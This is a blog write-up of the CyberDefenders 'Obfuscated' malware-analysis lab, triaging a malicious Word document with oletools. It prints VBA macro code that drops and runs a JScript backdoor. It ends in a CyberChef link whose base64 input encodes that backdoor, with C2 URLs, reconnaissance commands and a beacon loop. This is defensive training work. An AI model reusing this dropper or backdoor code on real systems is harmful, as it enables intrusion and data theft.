---
layout: post
author: remotephone
title:  "CyberDefenders - Obfuscated"
date:   2021-10-20 10:24:00 -0600
categories: lab workflow training dfir maldoc malware
---

# Obfuscated

Back again for another CyberDefenders post. This is [Obfuscated](https://cyberdefenders.org/labs/76) and I'll work this like the last one, poke around before I answer any questions. The prompt again is pretty simple,  you got a document, gotta tell them what it is. 

```
During your shift as a SOC analyst, the enterprise EDR alerted a suspicious behavior from an end-user machine. The user indicated that he received a recent email with a DOC file from an unknown sender and passed the document for you to analyze.
```

I downloaded the document, moved it to my linux environment, unzipped it with the password, and began.

## Looking around

First things first, get the sha256 of the file and run `file` on it to see what we got. 


```
└─(23:32:09)──> ls                                                                                                                                                   ──(Mon,Oct04)─┘
49b367ac261a722a7c2bbbc328c32545  c58-js-backdoor.zip
┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(23:32:09)──> sha256sum                                                                                                                                            ──(Mon,Oct04)─┘
┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(23:34:13)──> ls -asl                                                                                                                                        130 ↵ ──(Mon,Oct04)─┘
total 368
  4 drwxr-xr-x  2 computer computer   4096 Oct  4 23:31 .
  4 drwxr-xr-x 22 computer computer   4096 Oct  4 23:34 ..
196 -rw-r--r--  1 computer computer 199680 Sep 16 21:02 49b367ac261a722a7c2bbbc328c32545
164 -rwxrwxrwx  1 computer computer 164336 Oct  4 23:30 c58-js-backdoor.zip
┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(23:34:15)──> sha256sum 49b367ac261a722a7c2bbbc328c32545                                                                                                           ──(Mon,Oct04)─┘
ff2c8cadaa0fd8da6138cce6fce37e001f53a5d9ceccd67945b15ae273f4d751  49b367ac261a722a7c2bbbc328c32545
┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(23:34:19)──> file 49b367ac261a722a7c2bbbc328c32545                                                                                                                ──(Mon,Oct04)─┘
49b367ac261a722a7c2bbbc328c32545: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: user, Template: Normal.dotm, Last Saved By: John, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 08:00, Create Time/Date: Fri Nov 25 19:04:00 2016, Last Saved Time/Date: Fri Nov 25 20:04:00 2016, Number of Pages: 1, Number of Words: 320, Number of Characters: 1828, Security: 0
```

As expected, an office document. 

We're going to use oletools again because they're the best. I created a virtual environment with pipenv and then installed the tools with `pipenv install oletools`. First we use oledir to see the structure of the document.

```
(scratch) ┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/4)─┐
└─(23:36:12)──> oledir 49b367ac261a722a7c2bbbc328c32545                                                                                                              ──(Mon,Oct04)─┘
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file 49b367ac261a722a7c2bbbc328c32545:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size  
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |<Used>|Root   |Root Entry            |-    |-    |10   |11E     |13312 
1   |<Used>|Stream |Data                  |-    |-    |-    |106     |4096  
2   |<Used>|Stream |WordDocument          |9    |-    |-    |0       |133755
3   |<Used>|Storage|ObjectPool            |-    |-    |4    |0       |0     
4   |<Used>|Storage|_1541577328           |-    |-    |6    |0       |0     
5   |<Used>|Stream |\x03EPRINT            |-    |-    |-    |113     |5000  
6   |<Used>|Stream |\x01CompObj           |5    |7    |-    |0       |76    
7   |<Used>|Stream |\x03ObjInfo           |-    |8    |-    |2       |6     
8   |<Used>|Stream |\x01Ole10Native       |-    |-    |-    |120     |20301 
9   |<Used>|Stream |1Table                |1    |24   |-    |174     |8017  
10  |<Used>|Stream |\x05SummaryInformation|2    |11   |-    |3       |392   
11  |<Used>|Stream |\x05DocumentSummaryInf|-    |-    |-    |A       |284   
    |      |       |ormation              |     |     |     |        |      
12  |<Used>|Storage|Macros                |-    |-    |22   |0       |0     
13  |<Used>|Storage|VBA                   |-    |-    |17   |0       |0     
14  |<Used>|Stream |dir                   |-    |-    |-    |F       |565   
15  |<Used>|Stream |Module1               |14   |16   |-    |14B     |7117  
16  |<Used>|Stream |__SRP_0               |-    |-    |-    |18      |2964  
17  |<Used>|Stream |__SRP_1               |15   |19   |-    |47      |195   
18  |<Used>|Stream |__SRP_2               |-    |-    |-    |4B      |2717  
19  |<Used>|Stream |__SRP_3               |18   |20   |-    |76      |290   
20  |<Used>|Stream |ThisDocument          |-    |21   |-    |7B      |1104  
21  |<Used>|Stream |_VBA_PROJECT          |-    |-    |-    |8D      |3467  
22  |<Used>|Stream |PROJECT               |13   |23   |-    |C4      |483   
23  |<Used>|Stream |PROJECTwm             |-    |-    |-    |CC      |65    
24  |<Used>|Stream |\x01CompObj           |12   |3    |-    |CE      |114   
25  |unused|Empty  |                      |-    |-    |-    |0       |0     
26  |unused|Empty  |                      |-    |-    |-    |0       |0     
27  |unused|Empty  |                      |-    |-    |-    |0       |0     
----+----------------------------+------+--------------------------------------
id  |Name                        |Size  |CLSID                                 
----+----------------------------+------+--------------------------------------
0   |Root Entry                  |-     |00020906-0000-0000-C000-000000000046  
    |                            |      |Microsoft Word 97-2003 Document       
    |                            |      |(Word.Document.8)                     
24  |\x01CompObj                 |114   |                                      
11  |\x05DocumentSummaryInformati|284   |                                      
    |on                          |      |                                      
10  |\x05SummaryInformation      |392   |                                      
9   |1Table                      |8017  |                                      
1   |Data                        |4096  |                                      
12  |Macros                      |-     |                                      
22  |  PROJECT                   |483   |                                      
23  |  PROJECTwm                 |65    |                                      
13  |  VBA                       |-     |                                      
15  |    Module1                 |7117  |                                      
20  |    ThisDocument            |1104  |                                      
21  |    _VBA_PROJECT            |3467  |                                      
16  |    __SRP_0                 |2964  |                                      
17  |    __SRP_1                 |195   |                                      
18  |    __SRP_2                 |2717  |                                      
19  |    __SRP_3                 |290   |                                      
14  |    dir                     |565   |                                      
3   |ObjectPool                  |-     |                                      
4   |  _1541577328               |-     |0003000C-0000-0000-C000-000000000046  
    |                            |      |OLE Package Object (may contain and   
    |                            |      |run any file)                         
6   |    \x01CompObj             |76    |                                      
8   |    \x01Ole10Native         |20301 |                                      
5   |    \x03EPRINT              |5000  |                                      
7   |    \x03ObjInfo             |6     |                                      
2   |WordDocument                |133755|                                      
(scratch) ┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/4)─┐
└─(23:36:43)──>                                                                                                                                                      ──(Mon,Oct04)─┘
```


Then we'll do an `olevba` and see the summary of what we've got. 

```

(scratch) ┌─(~/scratch)────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/4)─┐
└─(23:37:12)──> olevba 49b367ac261a722a7c2bbbc328c32545                                                                                                              ──(Mon,Oct04)─┘
olevba 0.56.1 on Python 3.8.5 - http://decalage.info/python/oletools
===============================================================================
FILE: 49b367ac261a722a7c2bbbc328c32545
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: 49b367ac261a722a7c2bbbc328c32545 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
<SNIP> 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |maintools.js        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

You can use `oledump` to extract specific ole objects. Let's see a summary:

```
(scratch) ┌─(~/scratch)───────────────────────────────────────────────────────────────────────────────(computer@computer:pts/4)─┐
└─(00:15:24)──> python3 oledump.py 49b367ac261a722a7c2bbbc328c32545                               127 ↵ ──(Wed,Oct20)─┘
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

The interesting objects with macros appear to be 8 and 9. Let's look at 8 first (truncated some).

```
(scratch) ┌─(~/scratch)───────────────────────────────────────────────────────────────────────────────(computer@computer:pts/4)─┐
└─(00:15:29)──> python3 oledump.py 49b367ac261a722a7c2bbbc328c32545 -s 8 -v                         2 ↵ ──(Wed,Oct20)─┘
Attribute VB_Name = "Module1"
Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String
<SNIP..... >
On Error Resume Next
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub
<SNIP..... >
End If
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
<SNIP..... >

```

At this point, we can reasonable assume a file called `maintools.js` is going to get extracted and dropped to disk and executed via wscript.shell. 

There is a tool called [ViperMonkey](https://github.com/decalage2/ViperMonkey) that will let you execute macros without actually running them, but I was struggling to get it working in python3 and didn't want to go through the the whole exercise of getting it working. You also have the option of running it in a local sandbox, but I don't have a copy of MS Office around and don't typically keep windows VMs around for malware analysis.

Fortunately, this isn't sensitive, we can use cloud sandboxes, and any.run is a great one with a ton of features. We can use it to skip some tricky parts and get ahead. 

You can find analysis of the file [here](https://app.any.run/tasks/5840a1fa-9ad9-4c9e-963a-7bc5b6fa3eff/), I didn't even have to upload it, someone already did. We are going to just go by the honor system here and use it for the parts we need it and do the rest manually. Let's find the `maintools.js` file and see what we can get from it. You can find the file under the files tab and then click the file and view the content under the preview tab. 

I'm going to do this in a docker container to avoid the hassle of a VM and get some quick answers. This is not as secure as using an isolated virtual machine, but I'm already doing docker within a Linux VM on a host so I think it'd be tricky enough for something to get out for me to do this. I write the contents of the file using VIM to a text file and use `docker cp` to copy the file to the container 

```
┌─(~)───────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(21:23:51)──> docker cp wow 1df:/tmp/wow                                                              ──(Wed,Oct20)─┘
┌─(~)───────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(21:23:57)──> vi wow                                                                                  ──(Wed,Oct20)─┘
┌─(~)───────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(21:24:09)──> docker cp wow 1df:/tmp/wow                                                              ──(Wed,Oct20)─┘
┌─(~)───────────────────────────────────────────────────────────────────────────────────────(computer@computer:pts/3)─┐
└─(21:24:11)──> docker exec -it 1df bash                                                                ──(Wed,Oct20)─┘
root@1dfad72daf6e:/# ls /tmp
wow
```

I'll also need to install vim and nodejs in the container and then edit the file. I look for statements that look like they could run code, eval, and stuff like that and change them to console.log. This is dirty, but can work. I defang bits as I find them and console.log where I can. 

The defanged and (I think) safe to run function ends up lookign like this when I'm done.

```bash
root@1dfad72daf6e:/# head /tmp/wow
try{var wvy1 = 'EzZETcSXyKAdF_e5I2i1';var ssWZ = wvy1;var ES3c = y3zb();ES3c = LXv5(ES3c);ES3c = CpPT(ssWZ,ES3c);console.log(ES3c);
}catch (e)
{console.log(e);}function MTvK(CgqD){var XwH7 = CgqD.charCodeAt(0);if (XwH7 === 0x2B || XwH7 === 0x2D) return 62
<SNIP...>
```

You can take the ouput and send it to cyberchef to see what it looks like prettified. The  URL is huge but [this is it](https://gchq.github.io/CyberChef/#recipe=JavaScript_Beautify('%5C%5Ct','Auto',true,true)&input=ZnVuY3Rpb24gVXNwRCh6RG15KQp7dmFyIG0zbUggPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiQURPREIuU3RyZWFtIikKbTNtSC5UeXBlID0gMjttM21ILkNoYXJTZXQgPSAnNDM3JzttM21ILk9wZW4oKTttM21ILkxvYWRGcm9tRmlsZSh6RG15KTt2YXIgYzB4aSA9IG0zbUguUmVhZFRleHQ7bTNtSC5DbG9zZSgpO3JldHVybiBjel9iKGMweGkpO312YXIgQ0twUiA9IG5ldyBBcnJheSAoImh0dHA6Ly93d3cuc2FpcGFkaWVzZWwxMjQuY29tL3dwLWNvbnRlbnQvcGx1Z2lucy9pbXNhbml0eS90bXAucGhwIiwiaHR0cDovL3d3dy5mb2xrLWNhbnRhYnJpYS5jb20vd3AtY29udGVudC9wbHVnaW5zL3dwLXN0YXRpc3RpY3MvaW5jbHVkZXMvY2xhc3Nlcy9nYWxsZXJ5X2NyZWF0ZV9wYWdlX2ZpZWxkLnBocCIpO3ZhciB0cE84ID0gInczTHhuUlNiSmNxZjhIclUiO3ZhciBhdU1FID0gbmV3IEFycmF5KCJzeXN0ZW1pbmZvID4gIiwibmV0IHZpZXcgPj4gIiwibmV0IHZpZXcgL2RvbWFpbiA%2BPiAiLCJ0YXNrbGlzdCAvdiA%2BPiAiLCJncHJlc3VsdCAveiA%2BPiAiLCJuZXRzdGF0IC1uYW8gPj4gIiwiaXBjb25maWcgL2FsbCA%2BPiAiLCJhcnAgLWEgPj4gIiwibmV0IHNoYXJlID4%2BICIsIm5ldCB1c2UgPj4gIiwibmV0IHVzZXIgPj4gIiwibmV0IHVzZXIgYWRtaW5pc3RyYXRvciA%2BPiAiLCJuZXQgdXNlciAvZG9tYWluID4%2BICIsIm5ldCB1c2VyIGFkbWluaXN0cmF0b3IgL2RvbWFpbiA%2BPiAiLCJzZXQgID4%2BICIsImRpciAlc3lzdGVtZHJpdmUlXHg1Y1VzZXJzXHg1YyouKiA%2BPiAiLCJkaXIgJXVzZXJwcm9maWxlJVx4NWNBcHBEYXRhXHg1Y1JvYW1pbmdceDVjTWljcm9zb2Z0XHg1Y1dpbmRvd3NceDVjUmVjZW50XHg1YyouKiA%2BPiAiLCJkaXIgJXVzZXJwcm9maWxlJVx4NWNEZXNrdG9wXHg1YyouKiA%2BPiAiLCJ0YXNrbGlzdCAvZmkgXHgyMm1vZHVsZXMgZXEgd293NjQuZGxsXHgyMiAgPj4gIiwidGFza2xpc3QgL2ZpIFx4MjJtb2R1bGVzIG5lIHdvdzY0LmRsbFx4MjIgPj4gIiwiZGlyIFx4MjIlcHJvZ3JhbWZpbGVzKHg4NiklXHgyMiA%2BPiAiLCJkaXIgXHgyMiVwcm9ncmFtZmlsZXMlXHgyMiA%2BPiAiLCJkaXIgJWFwcGRhdGElID4%2BIik7dmFyIFFVankgPSBuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTt2YXIgTEl4RiA9IFdTY3JpcHQuU2NyaXB0TmFtZTt2YXIgdzVtWSA9ICIiO3ZhciBydUd4ID0gVGZPaCgpO2Z1bmN0aW9uIGhMaXQoWG5nUCx5MXFhKQp7Y2hhcl9zZXQgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyI7dmFyIFJqM2MgPSAiIjt2YXIgT0twQiA9ICIiO2ZvciAodmFyIGkgPSAwOyBpIDwgWG5nUC5sZW5ndGg7ICsraSkKe3ZhciBCOHdVID0gWG5nUC5jaGFyQ29kZUF0KGkpO3ZhciBMVXhnID0gQjh3VS50b1N0cmluZygyKTt3aGlsZSAoTFV4Zy5sZW5ndGggPCAoeTFxYSA/IDggOiAxNikpCkxVeGcgPSAiMCIgKyBMVXhnO09LcEIgKz0gTFV4Zzt3aGlsZSAoT0twQi5sZW5ndGggPj0gNikKe3ZhciB2alV1ID0gT0twQi5zbGljZSgwLDYpO09LcEIgPSBPS3BCLnNsaWNlKDYpO1JqM2MgKz0gdGhpcy5jaGFyX3NldC5jaGFyQXQocGFyc2VJbnQodmpVdSwyKSk7fX1pZiAoT0twQikKe3doaWxlIChPS3BCLmxlbmd0aCA8IDYpIE9LcEIgKz0gIjAiO1JqM2MgKz0gdGhpcy5jaGFyX3NldC5jaGFyQXQocGFyc2VJbnQoT0twQiwyKSk7fXdoaWxlIChSajNjLmxlbmd0aCAlICh5MXFhID8gNCA6IDgpICE9IDApClJqM2MgKz0gIj0iO3JldHVybiBSajNjO312YXIgYjkyQSA9IFtdO2I5MkFbJ0M3J10gICA9ICc4MCc7YjkyQVsnRkMnXSAgID0gJzgxJztiOTJBWydFOSddICAgPSAnODInO2I5MkFbJ0UyJ10gICA9ICc4Myc7YjkyQVsnRTQnXSAgID0gJzg0JztiOTJBWydFMCddICAgPSAnODUnO2I5MkFbJ0U1J10gICA9ICc4Nic7YjkyQVsnRTcnXSAgID0gJzg3JztiOTJBWydFQSddICAgPSAnODgnO2I5MkFbJ0VCJ10gICA9ICc4OSc7YjkyQVsnRTgnXSAgID0gJzhBJztiOTJBWydFRiddICAgPSAnOEInO2I5MkFbJ0VFJ10gICA9ICc4Qyc7YjkyQVsnRUMnXSAgID0gJzhEJztiOTJBWydDNCddICAgPSAnOEUnO2I5MkFbJ0M1J10gICA9ICc4Ric7YjkyQVsnQzknXSAgID0gJzkwJztiOTJBWydFNiddICAgPSAnOTEnO2I5MkFbJ0M2J10gICA9ICc5Mic7YjkyQVsnRjQnXSAgID0gJzkzJztiOTJBWydGNiddICAgPSAnOTQnO2I5MkFbJ0YyJ10gICA9ICc5NSc7YjkyQVsnRkInXSAgID0gJzk2JztiOTJBWydGOSddICAgPSAnOTcnO2I5MkFbJ0ZGJ10gICA9ICc5OCc7YjkyQVsnRDYnXSAgID0gJzk5JztiOTJBWydEQyddICAgPSAnOUEnO2I5MkFbJ0EyJ10gICA9ICc5Qic7YjkyQVsnQTMnXSAgID0gJzlDJztiOTJBWydBNSddICAgPSAnOUQnO2I5MkFbJzIwQTcnXSA9ICc5RSc7YjkyQVsnMTkyJ10gID0gJzlGJztiOTJBWydFMSddICAgPSAnQTAnO2I5MkFbJ0VEJ10gICA9ICdBMSc7YjkyQVsnRjMnXSAgID0gJ0EyJztiOTJBWydGQSddICAgPSAnQTMnO2I5MkFbJ0YxJ10gICA9ICdBNCc7YjkyQVsnRDEnXSAgID0gJ0E1JztiOTJBWydBQSddICAgPSAnQTYnO2I5MkFbJ0JBJ10gICA9ICdBNyc7YjkyQVsnQkYnXSAgID0gJ0E4JztiOTJBWycyMzEwJ10gPSAnQTknO2I5MkFbJ0FDJ10gICA9ICdBQSc7YjkyQVsnQkQnXSAgID0gJ0FCJztiOTJBWydCQyddICAgPSAnQUMnO2I5MkFbJ0ExJ10gICA9ICdBRCc7YjkyQVsnQUInXSAgID0gJ0FFJztiOTJBWydCQiddICAgPSAnQUYnO2I5MkFbJzI1OTEnXSA9ICdCMCc7YjkyQVsnMjU5MiddID0gJ0IxJztiOTJBWycyNTkzJ10gPSAnQjInO2I5MkFbJzI1MDInXSA9ICdCMyc7YjkyQVsnMjUyNCddID0gJ0I0JztiOTJBWycyNTYxJ10gPSAnQjUnO2I5MkFbJzI1NjInXSA9ICdCNic7YjkyQVsnMjU1NiddID0gJ0I3JztiOTJBWycyNTU1J10gPSAnQjgnO2I5MkFbJzI1NjMnXSA9ICdCOSc7YjkyQVsnMjU1MSddID0gJ0JBJztiOTJBWycyNTU3J10gPSAnQkInO2I5MkFbJzI1NUQnXSA9ICdCQyc7YjkyQVsnMjU1QyddID0gJ0JEJztiOTJBWycyNTVCJ10gPSAnQkUnO2I5MkFbJzI1MTAnXSA9ICdCRic7YjkyQVsnMjUxNCddID0gJ0MwJztiOTJBWycyNTM0J10gPSAnQzEnO2I5MkFbJzI1MkMnXSA9ICdDMic7YjkyQVsnMjUxQyddID0gJ0MzJztiOTJBWycyNTAwJ10gPSAnQzQnO2I5MkFbJzI1M0MnXSA9ICdDNSc7YjkyQVsnMjU1RSddID0gJ0M2JztiOTJBWycyNTVGJ10gPSAnQzcnO2I5MkFbJzI1NUEnXSA9ICdDOCc7YjkyQVsnMjU1NCddID0gJ0M5JztiOTJBWycyNTY5J10gPSAnQ0EnO2I5MkFbJzI1NjYnXSA9ICdDQic7YjkyQVsnMjU2MCddID0gJ0NDJztiOTJBWycyNTUwJ10gPSAnQ0QnO2I5MkFbJzI1NkMnXSA9ICdDRSc7YjkyQVsnMjU2NyddID0gJ0NGJztiOTJBWycyNTY4J10gPSAnRDAnO2I5MkFbJzI1NjQnXSA9ICdEMSc7YjkyQVsnMjU2NSddID0gJ0QyJztiOTJBWycyNTU5J10gPSAnRDMnO2I5MkFbJzI1NTgnXSA9ICdENCc7YjkyQVsnMjU1MiddID0gJ0Q1JztiOTJBWycyNTUzJ10gPSAnRDYnO2I5MkFbJzI1NkInXSA9ICdENyc7YjkyQVsnMjU2QSddID0gJ0Q4JztiOTJBWycyNTE4J10gPSAnRDknO2I5MkFbJzI1MEMnXSA9ICdEQSc7YjkyQVsnMjU4OCddID0gJ0RCJztiOTJBWycyNTg0J10gPSAnREMnO2I5MkFbJzI1OEMnXSA9ICdERCc7YjkyQVsnMjU5MCddID0gJ0RFJztiOTJBWycyNTgwJ10gPSAnREYnO2I5MkFbJzNCMSddICA9ICdFMCc7YjkyQVsnREYnXSAgID0gJ0UxJztiOTJBWyczOTMnXSAgPSAnRTInO2I5MkFbJzNDMCddICA9ICdFMyc7YjkyQVsnM0EzJ10gID0gJ0U0JztiOTJBWyczQzMnXSAgPSAnRTUnO2I5MkFbJ0I1J10gICA9ICdFNic7YjkyQVsnM0M0J10gID0gJ0U3JztiOTJBWyczQTYnXSAgPSAnRTgnO2I5MkFbJzM5OCddICA9ICdFOSc7YjkyQVsnM0E5J10gID0gJ0VBJztiOTJBWyczQjQnXSAgPSAnRUInO2I5MkFbJzIyMUUnXSA9ICdFQyc7YjkyQVsnM0M2J10gID0gJ0VEJztiOTJBWyczQjUnXSAgPSAnRUUnO2I5MkFbJzIyMjknXSA9ICdFRic7YjkyQVsnMjI2MSddID0gJ0YwJztiOTJBWydCMSddICAgPSAnRjEnO2I5MkFbJzIyNjUnXSA9ICdGMic7YjkyQVsnMjI2NCddID0gJ0YzJztiOTJBWycyMzIwJ10gPSAnRjQnO2I5MkFbJzIzMjEnXSA9ICdGNSc7YjkyQVsnRjcnXSAgID0gJ0Y2JztiOTJBWycyMjQ4J10gPSAnRjcnO2I5MkFbJ0IwJ10gICA9ICdGOCc7YjkyQVsnMjIxOSddID0gJ0Y5JztiOTJBWydCNyddICAgPSAnRkEnO2I5MkFbJzIyMUEnXSA9ICdGQic7YjkyQVsnMjA3RiddID0gJ0ZDJztiOTJBWydCMiddICAgPSAnRkQnO2I5MkFbJzI1QTAnXSA9ICdGRSc7YjkyQVsnQTAnXSAgID0gJ0ZGJztmdW5jdGlvbiBUZk9oKCkKe3ZhciBheXVoID0gTWF0aC5jZWlsKE1hdGgucmFuZG9tKCkqMTAgKyAyNSk7dmFyIG5hbWUgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKE1hdGguY2VpbChNYXRoLnJhbmRvbSgpKjI0ICsgNjUpKTt2YXIgZGM5ViA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0Lk5ldHdvcmsiKTt3NW1ZID0gZGM5Vi5Vc2VyTmFtZTtmb3IgKHZhciBjb3VudCA9IDA7IGNvdW50IDxheXVoIDtjb3VudCsrICkKe3N3aXRjaCAoTWF0aC5jZWlsKE1hdGgucmFuZG9tKCkqMykpCiAge2Nhc2UgMToKbmFtZSA9IG5hbWUgKyBNYXRoLmNlaWwoTWF0aC5yYW5kb20oKSo4KTsgICAgICBicmVhazsgICAgY2FzZSAyOgogICAgICAgIG5hbWUgPSBuYW1lICsgU3RyaW5nLmZyb21DaGFyQ29kZShNYXRoLmNlaWwoTWF0aC5yYW5kb20oKSoyNCArIDk3KSk7ICAgICAgYnJlYWs7ICAgIGRlZmF1bHQ6CiAgICAgICAgbmFtZSA9IG5hbWUgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKE1hdGguY2VpbChNYXRoLnJhbmRvbSgpKjI0ICsgNjUpKTsgICAgICBicmVhazsgIH19cmV0dXJuIG5hbWU7fXZhciB3eUtOID0gQmxneChiSWRHKCkpO3RyeQp7dmFyIFdFODYgPSBiSWRHKCk7ckdjUigpO2pTbTgoKTt9Y2F0Y2goZSkKe1dTY3JpcHQuUXVpdCgpO31mdW5jdGlvbiBqU204KCkKe3ZhciBjOWxyID0gRnY2YigpO3doaWxlKHRydWUpCntmb3IgKHZhciBpID0gMDsgaSA8IENLcFIubGVuZ3RoOyBpKyspCnt2YXIgWXN5byA9IENLcFJbaV07dmFyIGYzY2IgPSBYRVdHKFlzeW8sYzlscik7CnN3aXRjaCAoZjNjYikKe2Nhc2UgImdvb2QiOgogICAgYnJlYWs7ICBjYXNlICJleGl0IjogV1NjcmlwdC5RdWl0KCk7ICAgIGJyZWFrOyAgY2FzZSAid29yayI6IFhCTDMoWXN5byk7ICAgIGJyZWFrOyAgY2FzZSAiZmFpbCI6IHRiTXUoKTsKICAgIGJyZWFrOyAgZGVmYXVsdDoKICAgIGJyZWFrO31UZk9oKCk7fVdTY3JpcHQuU2xlZXAoKE1hdGgucmFuZG9tKCkqMzAwICsgMzYwMCkgKiAxMDAwKTt9fWZ1bmN0aW9uIGJJZEcoKQp7dmFyIHNwcTM9IHRoaXNbJ1x1MDA0MVx1MDA2M1x1MDA3NGlcdTAwNzZlWFx1MDA0Rlx1MDA2MmpcdTAwNjVjXHUwMDc0J107dmFyIHpCVnYgPSBuZXcgc3BxMygnXHUwMDU3XHUwMDUzY3JcdTAwNjlcdTAwNzBcdTAwNzRcdTAwMkVcdTAwNTNoZVx1MDA2Q1x1MDA2QycpO3JldHVybiB6QlZ2O31mdW5jdGlvbiBYQkwzKEJfVEcpCnt2YXIgWUltZSA9ICB3eUtOICsgTEl4Ri5zdWJzdHJpbmcoMCxMSXhGLmxlbmd0aCAtIDIpICsgInBpZiI7dmFyIEtweG8gPSBuZXcgQWN0aXZlWE9iamVjdCgiTVNYTUwyLlhNTEhUVFAiKTtLcHhvLk9QRU4oInBvc3QiLEJfVEcsZmFsc2UpO0tweG8uU0VUUkVRVUVTVEhFQURFUigidXNlci1hZ2VudDoiLCJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQpOyAiICsgU3o4aygpKTtLcHhvLlNFVFJFUVVFU1RIRUFERVIoImNvbnRlbnQtdHlwZToiLCJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKTtLcHhvLlNFVFJFUVVFU1RIRUFERVIoImNvbnRlbnQtbGVuZ3RoOiIsIjQiKTtLcHhvLlNFTkQoIndvcmsiKTtpZiAoUVVqeS5GSUxFRVhJU1RTKFlJbWUpKQp7UVVqeS5ERUxFVEVGSUxFKFlJbWUpO31pZiAoS3B4by5TVEFUVVMgPT0gMjAwKQp7dmFyIG0zbUggPSBuZXcgQWN0aXZlWE9iamVjdCgiQURPREIuU1RSRUFNIik7bTNtSC5UWVBFID0gMTttM21ILk9QRU4oKTttM21ILldSSVRFKEtweG8ucmVzcG9uc2VCb2R5KTttM21ILlBvc2l0aW9uID0gMDttM21ILlR5cGUgPSAyO20zbUguQ2hhclNldCA9ICI0MzciO3ZhciBjMHhpID0gbTNtSC5SZWFkVGV4dChtM21ILlNpemUpO